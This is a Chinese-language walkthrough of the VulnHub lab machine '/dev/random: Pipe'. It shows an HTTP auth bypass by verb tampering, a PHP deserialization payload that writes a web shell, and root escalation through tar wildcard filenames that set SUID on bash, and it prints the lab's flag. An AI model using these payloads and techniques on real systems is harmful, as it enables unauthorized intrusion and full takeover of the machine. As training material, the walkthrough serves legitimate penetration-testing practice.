# /dev/random: Pipe

2025.03.11 https://www.vulnhub.com/entry/devrandom-pipe,124/

[video](https://www.bilibili.com/video/BV1YqQGYoEG7/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
57996/tcp open  unknown
```

访问 http://192.168.5.39/ 是 http-basic 认证，目前没有用户名和密码，nmap 扫描发现 Basic realm=index.php 。

目录扫描 http://192.168.5.39/images/pipe.jpg 下载图片查看隐写，没有隐写。

发现另外一个目录 http://192.168.5.39/scriptz/ 里面有 log.php.BAK 和 php.js ， 下载 BAK 文件，里面有 php 代码，后面可能使用 php 反序列化。

需要找到用户名和密码通过签名的 http 认证才能继续进行,经过爆破没有找到。

尝试使用 BP 拦截，然后修改访问方式为 POST 访问地址为 /index.php 就得到了 index.php 页面的内容，查看页面源代码，发现：

```html
<script src="scriptz/php.js"></script>
<script>
    function submit_form() {
        var object = serialize({ id: 1, firstname: "Rene", surname: "Margitte", artwork: "The Treachery of Images" });
        object = object.substr(object.indexOf("{"), object.length);
        object = 'O:4:"Info":4:' + object;
        document.forms[0].param.value = object;
        document.getElementById("info_form").submit();
    }
</script>

<form action="index.php" id="info_form" method="POST">
    <input type="hidden" name="param" value="" />
    <a href="#" onclick="submit_form(); return false;">Show Artist Info.</a>
</form>

O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The Treachery of Images";}
```

发现 serialize 将 object 转化成了 php 反序列化字符串，然后将值设置到 form 表单中的 param 参数上，点击后，就进行了提交：

```
curl --data 'param=O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The Treachery of Images";}' http://192.168.5.39/index.php
```

查看 log.php.BAK 这个文件，发现其中在 destruct 函数中写入了文件，可能有反序列化写入文件的漏洞，尝试构造 Log 这个类，然后用上面接口提交，触发这个类的反序列化执行：

```php
<?php
class Log
{
    public $filename = '/var/www/html/images/shell.php'; # 这里看到有 images 和 scriptz 2个目录，看看哪个目录能有写权限
    public $data = '<?php echo 1; system($_REQUEST[1]);?>';
}
$log = new Log();
$serialized_data = serialize($log);
echo  $serialized_data;
?>
```

```
curl --data-urlencode 'param=O:3:"Log":2:{s:8:"filename";s:30:"/var/www/html/images/shell.php";s:4:"data";s:37:"<?php echo 1; system($_REQUEST[1]);?>";}' http://192.168.5.39/index.php

curl -X POST http://192.168.5.39/images/shell.php?1=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

执行反弹 shell，到 kali 上。

在/home/rene/backup/中发现 backup.tar.gz 和 sys-17532.BAK ，同时发现 sys-30855.BAK 这种文件每 1 分钟生成一次，crontab 发现：

```
* * * * * root /root/create_backup.sh
*/5 * * * * root /usr/bin/compress.sh
```

create_backup.sh 没权限读取，看不到具体内容。

/usr/bin/compress.sh 每 5 分钟执行一次，内容为：

```
rm -f /home/rene/backup/backup.tar.gz
cd /home/rene/backup
tar cfz /home/rene/backup/backup.tar.gz *
chown rene:rene /home/rene/backup/backup.tar.gz
rm -f /home/rene/backup/*.BAK
```

发现会将 /home/rene/backup 中的所有内容进行打包,同时 backup 目录的权限是 777，这里可以使用 tar 提权：

```
cd /home/rene/backup
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" >> --checkpoint=1
```

等待 5 个整数分钟，这时 bash 已经变成 suid 权限，可以直接提到 root 权限：

```
www-data@pipe:/home/rene/backup$ /bin/bash -p
bash-4.3# cd /root
bash-4.3# ls
create_backup.sh  flag.txt
bash-4.3# cat flag.txt

Well Done!
Here's your flag: 0089cd4f9ae79402cdd4e7b8931892b7
```
